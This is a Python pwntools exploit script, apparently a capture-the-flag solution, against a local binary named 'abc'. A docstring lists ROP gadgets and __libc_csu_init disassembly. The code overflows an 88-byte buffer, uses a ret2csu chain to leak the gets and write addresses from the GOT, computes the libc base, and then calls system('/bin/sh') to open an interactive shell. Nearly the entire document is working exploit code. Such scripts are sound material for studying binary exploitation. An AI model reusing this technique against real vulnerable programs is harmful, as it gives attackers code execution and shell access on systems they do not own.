from pwn import *
"""
Useful gadgets:

   0x00000000004005e3: pop rdi; ret; 
   0x00000000004005e1: pop rsi; pop r15; ret; 

_libc_csu_init:

   0x0000000000400580 <+0>:     push   r15
   0x0000000000400582 <+2>:     push   r14
   0x0000000000400584 <+4>:     mov    r15,rdx
   0x0000000000400587 <+7>:     push   r13
   0x0000000000400589 <+9>:     push   r12
   0x000000000040058b <+11>:    lea    r12,[rip+0x20087e]        # 0x600e10
   0x0000000000400592 <+18>:    push   rbp
   0x0000000000400593 <+19>:    lea    rbp,[rip+0x20087e]        # 0x600e18
   0x000000000040059a <+26>:    push   rbx
   0x000000000040059b <+27>:    mov    r13d,edi
   0x000000000040059e <+30>:    mov    r14,rsi
   0x00000000004005a1 <+33>:    sub    rbp,r12
   0x00000000004005a4 <+36>:    sub    rsp,0x8
   0x00000000004005a8 <+40>:    sar    rbp,0x3
   0x00000000004005ac <+44>:    call   0x400400 <_init>
   0x00000000004005b1 <+49>:    test   rbp,rbp
   0x00000000004005b4 <+52>:    je     0x4005d6 <__libc_csu_init+86>
   0x00000000004005b6 <+54>:    xor    ebx,ebx
   0x00000000004005b8 <+56>:    nop    DWORD PTR [rax+rax*1+0x0]
   0x00000000004005c0 <+64>:    mov    rdx,r15
   0x00000000004005c3 <+67>:    mov    rsi,r14
   0x00000000004005c6 <+70>:    mov    edi,r13d
   0x00000000004005c9 <+73>:    call   QWORD PTR [r12+rbx*8]
   0x00000000004005cd <+77>:    add    rbx,0x1
   0x00000000004005d1 <+81>:    cmp    rbp,rbx
   0x00000000004005d4 <+84>:    jne    0x4005c0 <__libc_csu_init+64>
   0x00000000004005d6 <+86>:    add    rsp,0x8
   0x00000000004005da <+90>:    pop    rbx
   0x00000000004005db <+91>:    pop    rbp
   0x00000000004005dc <+92>:    pop    r12
   0x00000000004005de <+94>:    pop    r13
   0x00000000004005e0 <+96>:    pop    r14
   0x00000000004005e2 <+98>:    pop    r15
   0x00000000004005e4 <+100>:   ret    

"""

p = process('./abc')
elf = ELF('./abc')
context.binary = elf
main = p64(0x400537)
pop_rdi = p64(0x4005e3)
ret = p64(0x4005e4)

# leak libc addresses
write_got = elf.got['write']
gets_got = elf.got['gets']
csu_call = p64(0x4005c0)
csu_pops = p64(0x4005da)
rbx = p64(0)
rbp = p64(1)
r12 = p64(write_got) # rip
r13 = p64(1) # edi, fd
r14 = p64(gets_got) # rsi, buffer
r15 = p64(8) # rdx, count
pay = "A" * 88 + csu_pops + rbx + rbp + r12 + r13 + r14 + r15 + csu_call + "A" * 8 + rbx + rbp + r12 + r13 + p64(write_got) + r15 + csu_call + "A" * 8 +  rbx + rbp + r12 + r13 + r14 + r15 + main
raw_input("Checkpoint!")
p.recvuntil(":")
p.sendline(pay)
leak = p.recv(32).strip()[::-1][5:]
gets_leak = leak[8:16]
write_leak = leak[0:8]
gets_libc = int(gets_leak.encode('hex'), base=16)

print (leak.encode('hex'))

# back to main again leak 
print ('gets', gets_leak.encode('hex'))
print ('write', write_leak.encode('hex'))

system_offset = 0x4f550
binsh_offset = 0x1b3e1a
gets_offset = 0x80190

libc_base = gets_libc - gets_offset
system = p64(libc_base + system_offset)
binsh = p64(libc_base + binsh_offset)
ret = p64(0x00000000004005e4)

print ('libc_base', hex(libc_base))
raw_input("checkpoint2!")
pay = "A" * 88 + ret + pop_rdi + binsh + system + main
p.sendline(pay)

p.interactive()
